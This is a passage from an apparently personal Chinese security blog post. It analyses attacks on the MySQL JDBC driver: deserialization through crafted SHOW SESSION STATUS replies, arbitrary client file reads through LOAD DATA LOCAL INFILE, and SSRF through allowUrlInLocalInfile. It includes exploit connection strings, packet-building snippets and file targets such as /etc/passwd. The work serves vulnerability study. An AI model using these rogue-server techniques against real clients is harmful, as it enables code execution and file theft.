</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">Driver</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;com.mysql.cj.jdbc.Driver&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">DB_URL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;jdbc:mysql://127.0.0.1:3306/newtest?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">Driver</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">DB_URL</span><span class="p">,</span><span class="s">&#34;root&#34;</span><span class="p">,</span><span class="s">&#34;123456&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Statement</span><span class="w"> </span><span class="n">statement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="na">createStatement</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        5.执行SQL的对象去执行SQL，返回结果集</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;select * from test.java_objects;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">resultSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">statement</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">(</span><span class="n">sql</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">resultSet</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>我们去连接一个正常的mysql服务，看看是怎么交互的</p>
<h3 id="流量层面">流量层面<a hidden class="anchor" aria-hidden="true" href="#流量层面">#</a></h3>
<p>通过<code>tcp.port ==3306 &amp;&amp; mysql</code>，赛选流量</p>
<p>我们可以看到在执行<code>SHOW SESSION STATUS</code>前，client和mysql服务之间其实已经做过一些交互了。</p>
<p><img loading="lazy" src="images/image-20250213204740838.png" alt="image-20250213204740838"  />
</p>
<p>这里因为都是mysql协议，有些tcp协议没有，<code>11这步</code>我看参考文章没有，但是我这边请求的时候有这步</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1.--&gt;应该是client去请求mysql (tcp)
</span></span><span class="line"><span class="cl">2.&lt;--mysql返回一个 Greeting (有mysql版本信息)
</span></span><span class="line"><span class="cl">3.--&gt;client去连接mysql，数据库和登录信息
</span></span><span class="line"><span class="cl">4.&lt;--mysql返回OK
</span></span><span class="line"><span class="cl">5.--&gt;clint 查询了一大堆sql变量
</span></span><span class="line"><span class="cl">	SELECT  @@session.auto_increment_increment AS auto_increment_increment,... //这里省略了
</span></span><span class="line"><span class="cl">6.&lt;--mysql返回对应值
</span></span><span class="line"><span class="cl">7.--&gt;client设置 SET NAMES utf8
</span></span><span class="line"><span class="cl">8.&lt;--mysql返回OK
</span></span><span class="line"><span class="cl">9.--&gt;SET character_set_results = NULL
</span></span><span class="line"><span class="cl">10.&lt;--mysql返回OK
</span></span><span class="line"><span class="cl">11.--&gt;SELECT @@session.autocommit
</span></span><span class="line"><span class="cl">12.&lt;--mysql返回对应值
</span></span><span class="line"><span class="cl">13.--&gt;SHOW SESSION STATUS
</span></span><span class="line"><span class="cl">14.&lt;--mysql返回对应值
</span></span></code></pre></div><p>然后这里思路是跟着参考文章进行的，这里<code>查询的语句</code>其实是<code>固定的</code>，而结果其实也可以是固定的，client又分别不出来。所以前面的返回值，我们都可以照抄mysql服务的，我们只需要构造出<code>SHOW SESSION STATUS</code>的返回值即可。</p>
<h3 id="构造数据包">构造数据包<a hidden class="anchor" aria-hidden="true" href="#构造数据包">#</a></h3>
<p>这里我和参考文章的构造思路不一样，其实不用想那么复杂，也不用完全自己去构造一个数据包，这些都可以让mysql来帮我们做</p>
<p><img loading="lazy" src="images/image-20250213210720980.png" alt="image-20250213210720980"  />
</p>
<blockquote>
<p>我之前说过<code>SHOW SESSION STATUS</code>的结果，其实就是查询了一个有两个字段的表，上图中两个<code>field packet</code>就对应的<code>两列</code>，而每个<code>row packet</code>其实就是<code>一行结果的一对值</code>而已，而每个值都会被<code>getObject()</code>调用的（也就是都有可能反序列化的）。</p>
</blockquote>
<p>我起初想的直接替换一个<code>row packet</code>，这样整体的len以及其他参数也不会被影响改好自己这个<code>row packet</code>就行了。但其实不行，利用点这里<code>switch</code>的是<code>field中的Type</code>（而不是靠<code>row packet</code>中的数据识别），所以我们也要修改掉这个值。而改这个的话，其他值也会受影响，不如搞个新的。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">columnDefinition</span><span class="p">.</span><span class="na">getFields</span><span class="p">()</span><span class="o">[</span><span class="n">columnIndexMinusOne</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">field</span><span class="p">.</span><span class="na">getMysqlType</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="n">BIT</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">...</span><span class="w">
</span></span></span></code></pre></div><p>我说过<code>SHOW SESSION STATUS</code>的结果，其实就是查询了一个有两个字段的表</p>
<blockquote>
<p>那我直接建一个这样的表，并且第二个数据就是序列化的数据。然后抓到这个流量直接替换不就行了！</p>
</blockquote>
<p>mysql</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">java_objects</span><span class="w"> </span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="n">AUTO_INCREMENT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">serialized_object</span><span class="w"> </span><span class="nb">BLOB</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">insert</span><span class="w"> </span><span class="n">java_objects</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;C:\\Users\\jie\\Desktop\\learn\\java\\TOOLS\\ser.bin&#39;</span><span class="p">));</span><span class="w">
</span></span></span></code></pre></div><blockquote>
<p>然后我们<code>要发送的数据</code>从<code>MySQL Protocol - column count</code>到<code>MySQL Protocol - response OK</code>结束，测试是成功的。（脚本中<code>mysql_data</code>就是要发送整个的值）</p>
<p>不过我这边多了一步<code>SELECT @@session.autocommit</code>，不过问题不大，在原脚本基础上再加一个这个的返回值就好了</p>
</blockquote>
<p><img loading="lazy" src="images/image-20250213212044706.png" alt="image-20250213212044706"  />
</p>
<p>然后可以利用了但是，不方便，总不能每次换个链子就去抓个流量吧</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="s2">&#34;show session status&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">mysql_data</span><span class="o">=</span><span class="s1">&#39;01000001023...&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span></code></pre></div><p>那其实改的话，也就控制好上图这个<code>row packet</code>就行。也就是控制好<code>长度的变化</code>就行了</p>
<p><img loading="lazy" src="images/image-20250214091715526.png" alt="image-20250214091715526"  />
</p>
<p>然后这块<code>row packet数据</code>是从<code>0605开始到序列化数据结束</code>，我这里直接一起说了吧，懒得每个截图了</p>
<blockquote>
<p>这里将这个整个要返回的数据分成这几块</p>
<ul>
<li>
<p>0100000102360000020364656&hellip;</p>
<ul>
<li>//column count和filed packet那块数据，我用mysql都设置好了，不用改</li>
</ul>
</li>
<li>
<p>060500 04 0131 fc 0105</p>
<ul>
<li>
<p>长度这里都是采用<code>小端序</code>，0605实际长度要<code>倒过来计算</code>，<code>0506</code>的值才是1286</p>
</li>
<li>
<p><code>060500</code>（row packet开头）代表的整个<code>row packet</code>的长度，这里选到<code>Packet Length: 1286</code>右边对应的是<code>060500</code>，这里我开始觉得<code>00</code>是用来分割的，经过下方**<code>Packet Length 验证</code>**的分析，<code>Packet Length</code>确实对应<code>3byte</code></p>
</li>
<li>
<p><code>04</code>代表<code>Packet Number: 4</code>，意思是这是第四个数据包。在这个poc下，这个值也是固定的</p>
</li>
<li>
<p><code>0131</code> <code>01</code>代表的是长度及len=1，<code>31十六进制</code>对应<code>49十进制</code>（代表int 1），这个也是固定的</p>
</li>
<li>
<p><code>fc</code>，应该是代表<code>BLOB数据类型</code>的！——！</p>
</li>
<li>
<p><code>0105</code> 及就是<code>序列化数据的长度</code>了</p>
</li>
</ul>
</li>
<li>
<p>aced0005737200116a6176612e&hellip; //序列化数据</p>
</li>
<li>
<p>07000005fe000002000000      //MySQL Protocol - response OK 数据</p>
</li>
</ul>
</blockquote>
<p>所以要注意的就是<code>row packet的整个len</code>和<code>序列化数据的len</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload_length</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload_content</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload_length_hex</span> <span class="o">=</span> <span class="n">payload_length</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">payload_length</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="n">data_len</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload_content</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">5</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">data_len_hex</span> <span class="o">=</span> <span class="n">data_len</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">data_len</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
</span></span></code></pre></div><blockquote>
<p>那简单说说吧，这里<code>len//2</code>是因为获取的是16进制的长度，但<code>两个16进制字符</code>才代表<code>一个数据</code>，所以要除2</p>
<p>然后data_len为什么要<code>+5</code>,data_len对应流量中<code>两个text</code>的长度，第一个是<code>0131</code>这里+2，第二个还有<code>fc+序列化数据的长度(len需要两个数据记录)</code> 没算上这里要+3，所以要+5 //参考文章这里是+4,估计是没第一个text</p>
</blockquote>
<p>然后就得到上面用的脚本啦，脚本也只是在前辈脚本上涂涂画画hhh，感觉还不错</p>
<p>不过我Greeting那个返回数据，我用我8.0.x版本的mysql生成的数据发送就是不行，用原脚本5.7的就可以，其他的数据都没问题就这个地方不行，看着也没啥毛病！——！</p>
<p><img loading="lazy" src="images/image-20250214100615889.png" alt="image-20250214100615889"  />
</p>
<h1 id="0x2-mysql-任意文件读取--ssrf">0x2 Mysql 任意文件读取 &amp; SSRF<a hidden class="anchor" aria-hidden="true" href="#0x2-mysql-任意文件读取--ssrf">#</a></h1>
<h3 id="mysql-任意文件读取原理">Mysql 任意文件读取原理<a hidden class="anchor" aria-hidden="true" href="#mysql-任意文件读取原理">#</a></h3>
<p>**利用条件：**client端具有<code>文件读取权限</code></p>
<blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">load</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="n">infile</span><span class="w"> </span><span class="s2">&#34;/data/data.csv&#34;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">TestTable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">load</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="n">infile</span><span class="w"> </span><span class="s2">&#34;/data/test.csv&#34;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">TestTable</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></div><p>第一行是读取<code>服务端</code>本地的文件，第二行是读取<code>客户端</code>本地的文件。</p>
<p>问题就出在<code>第二行</code></p>
<p>该漏洞的核心原理在于MySQL服务端可以利用 <code>LOAD DATA LOCAL</code> 命令来读取MYSQL客户端的任意文件。</p>
<ol>
<li>客户端：把我我本地<code>/data/test.csv</code>的内容插入到TestTable表中去</li>
<li>服务端：请把你本地<code>/etc/passwd</code>的内容发送给我  //正常应该是要求client端发送/data/test.csv的内容</li>
<li>客户端：好的，这是我本地<code>/etc/passwd</code>的内容：&hellip;.</li>
<li>服务端：到这我们就获取到了<code>/etc/passwd</code>的内容</li>
</ol>
</blockquote>
<p><strong>环境</strong></p>
<p>依赖用mysql反序列化的就行</p>
<p>然后运行mysql恶意服务</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">mysql</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.Connection</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.DriverManager</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">read_file</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">Driver</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;com.mysql.cj.jdbc.Driver&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 1、加载驱动</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">Driver</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="s">&#34;jdbc:mysql://127.0.0.1:3307/test?allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&amp;maxAllowedPacket=655360#&amp;serverTimezone=Asia/Shanghai&amp;allowLoadLocalInfile=false&amp;allowUrlInLocalInfile=false&#34;</span><span class="p">,</span><span class="s">&#34;win_hosts&#34;</span><span class="p">,</span><span class="s">&#34;123456&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Connection conn = DriverManager.getConnection(&#34;jdbc:mysql://127.0.0.1:3306/newtest?allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&amp;maxAllowedPacket=655360&amp;serverTimezone=Asia/Shanghai&#34;,&#34;root&#34;,&#34;123456&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">conn</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h2 id="0x01-分析-1">0x01 分析<a hidden class="anchor" aria-hidden="true" href="#0x01-分析-1">#</a></h2>
<p>此分析借助了 <a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a> 这位佬写的工具。使用还是很好用的，但是感觉不是很好读，我也不想细看，直接分析流量吧，然后自己写一个吧</p>
<blockquote>
<p>分析前我就在想，java连接mysql也不会自己执行<code>load data local infile</code>吧，这个咋触发的呀，分析完怎么说呢，不用java请求执行<code>load data local infile</code>，但是java能处理<code>Response LOCAL INFILE</code>就行</p>
</blockquote>
<p>那直接看到<code>NativeSession#loadServerVariables</code>，看这个第一个if的判断，这里会获取mysql服务端的版本和<code>5.1.0</code>进行一个比较，这里我们希望进入else，<code>进入if其实也能操作的</code>(下方0x02有验证)</p>
<p><img loading="lazy" src="images/image-20250218105602685.png" alt="image-20250218105602685"  />
</p>
<p>这里我们mysql恶意服务端版本是<code>5.0.2</code>,<code>compareTo()</code>中大于返回1，等于返回0，<code>小于返回-1</code></p>
<p>第一个都是5，第二个我们是<code>0&lt;1</code>所以这里返回<code>-1</code></p>
<p><img loading="lazy" src="images/image-20250218105952838.png" alt="image-20250218105952838"  />
</p>
<p>然后<code>进入else</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">NativePacketPayload</span><span class="w"> </span><span class="n">resultPacket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sendCommand</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">commandBuilder</span><span class="p">.</span><span class="na">buildComQuery</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">versionComment</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;SHOW VARIABLES&#34;</span><span class="p">),</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Resultset</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">NativeProtocol</span><span class="p">)</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">protocol</span><span class="p">).</span><span class="na">readAllResults</span><span class="p">(</span><span class="o">-</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="n">resultPacket</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">new</span><span class="w"> </span><span class="n">ResultsetFactory</span><span class="p">(</span><span class="n">Type</span><span class="p">.</span><span class="na">FORWARD_ONLY</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250218110516409.png" alt="image-20250218110516409"  />
</p>
<p>这里会给<code>mysql服务端</code>发送一个<code>SHOW VARIABLES</code>，然后<code>java客户端</code>这边会处理<code>mysql返回的数据</code>,然后漏洞利用也就在这个<code>readAllResults()</code>处理数据这里面了</p>
<p>这里其实if和else处理mysql数据逻辑是一样的，所以我觉得应该都是可以利用的（可以的哟）</p>
<p><img loading="lazy" src="images/image-20250218110810288.png" alt="image-20250218110810288"  />
</p>
<p>我们跟进<code>readAllResults()</code>,跟进到<code>TextResultsetReader#read</code></p>
<p>这里会先判断<code>mysql返回值</code>有没有<code>字段</code>，这里我们要让我们的<code>columnCount</code>为<code>-1</code>才行，要进入<code>下方的else</code></p>
<p><img loading="lazy" src="images/image-20250218111151483.png" alt="image-20250218111151483"  />
</p>
<p>那我们跟进看看具体逻辑吧，传入的类型是<code>INT_LENENC</code>，进入对应case</p>
<p>会和<code>mysql返回的数据的第一个byte</code>和<code>0xff</code>做<code>&amp;运算</code>值为<code>251（其实就是0xfb）</code>即返回<code>NULL_LENGTH(-1)</code></p>
<p><img loading="lazy" src="images/image-20250218144816863.png" alt="image-20250218144816863"  />
</p>
<p>可以看到这里必须是<code>-1</code>才行（这里<code>if</code>其实也是判断是不是<code>LOCAL INFILE Packet (0xfb)</code>类型），<code>resultPacket.readString()</code>会去识别mysql数据中的<code>文件名</code>，然后<code>this.protocol.sendFileToServer()</code>读取发送<code>文件内容</code>给<code>mysql服务端</code></p>
<p><img loading="lazy" src="images/image-20250218145129422.png" alt="image-20250218145129422"  />
</p>
<p>文件名获取逻辑：其实就是取第一个byte(<code>0xfb用来表示类型的</code>)，以及去除后面的<code>00</code></p>
<p><img loading="lazy" src="images/image-20250218150041603.png" alt="image-20250218150041603"  />
</p>
<p>然后看到<code>sendFileToServer()</code>，这里我们知道要让<code>allowLoadLocalInfile=true</code></p>
<p><img loading="lazy" src="images/image-20250218150316615.png" alt="image-20250218150316615"  />
</p>
<p>下面有个关于<code>allowUrlInLocalInfile</code>的设置，<code>true可以远程加载</code>，这里我们读取的是<code>本地文件</code>其实无所谓这个参数</p>
<p><img loading="lazy" src="images/image-20250218150920087.png" alt="image-20250218150920087"  />
</p>
<p>然后<code>read</code>读取<code>文件数据</code>后，<code>send</code>发送给<code>mysql服务端</code></p>
<p><img loading="lazy" src="images/image-20250218151219834.png" alt="image-20250218151219834"  />
</p>
<h3 id="mysql-ssrf">[*]Mysql SSRF<a hidden class="anchor" aria-hidden="true" href="#mysql-ssrf">#</a></h3>
<p>上面分析中说到这个<code>allowUrlInLocalInfile</code>，给这个参数设置<code>true</code>or<code>YES</code>，或进入下面这个else中，<code>URL.openSteam()</code>这里会发出<code>url请求</code>，下方<code>read和send</code>还会吧请求返回的<code>结果</code>发送给我们的<code>恶意MySQL服务</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">这里测试下面这两个都是可以成功请求的
</span></span><span class="line"><span class="cl">http://baidu.com/
</span></span><span class="line"><span class="cl">file:///c:\windows\win.ini
</span></span></code></pre></div><p><img loading="lazy" src="images/image-20250225100932593.png" alt="image-20250225100932593"  />
</p>
<p>继续跟进<code>openSteam()</code>的话，url请求会在这个<code>writeRequests()</code>发送</p>
<p><img loading="lazy" src="images/image-20250225101211555.png" alt="image-20250225101211555"  />
</p>
<h3 id="packet-length-验证">Packet Length 验证<a hidden class="anchor" aria-hidden="true" href="#packet-length-验证">#</a></h3>
<p>为了监测这个是3字节还是2字节，我这里想的是传一个超过<code>0xffff</code>长度的数据，看mysql会怎么操作，发现超过<code>0x4000</code>，就会进行<code>分段传输处理</code>，所以我还是认为<code>00</code>是用来分割的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="w"> </span><span class="n">定义要生成的文件路径</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">file_path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">large_binary_file</span><span class="p">.</span><span class="na">bin</span><span class="err">&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">设定目标文件大小</span><span class="err">，</span><span class="n">这里将其设为</span><span class="w"> </span><span class="n">0x10000</span><span class="err">（</span><span class="n">大于</span><span class="w"> </span><span class="n">0xffff</span><span class="err">）</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">target_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0x10000</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">以二进制写入模式打开文件</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">with</span><span class="w"> </span><span class="nf">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">wb</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">file</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="n">每次写入一个字节的数据</span><span class="err">，</span><span class="n">循环直至达到目标文件大小</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="nf">range</span><span class="p">(</span><span class="n">target_size</span><span class="p">):</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="err">#</span><span class="w"> </span><span class="n">写入一个字节</span><span class="err">，</span><span class="n">值为</span><span class="w"> </span><span class="n">0</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">file</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">b</span><span class="sc">&#39;a&#39;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">print</span><span class="p">(</span><span class="n">f</span><span class="s">&#34;已生成数据长度大于 0xffff 的二进制文件: {file_path}&#34;</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">large_text_table</span><span class="w"> </span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="n">AUTO_INCREMENT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span><span class="w">  </span><span class="c1">-- 自增的主键字段
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="n">large_text_data</span><span class="w"> </span><span class="n">LONGTEXT</span><span class="w">            </span><span class="c1">-- 用于存储大文本数据的字段
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">);</span><span class="w">
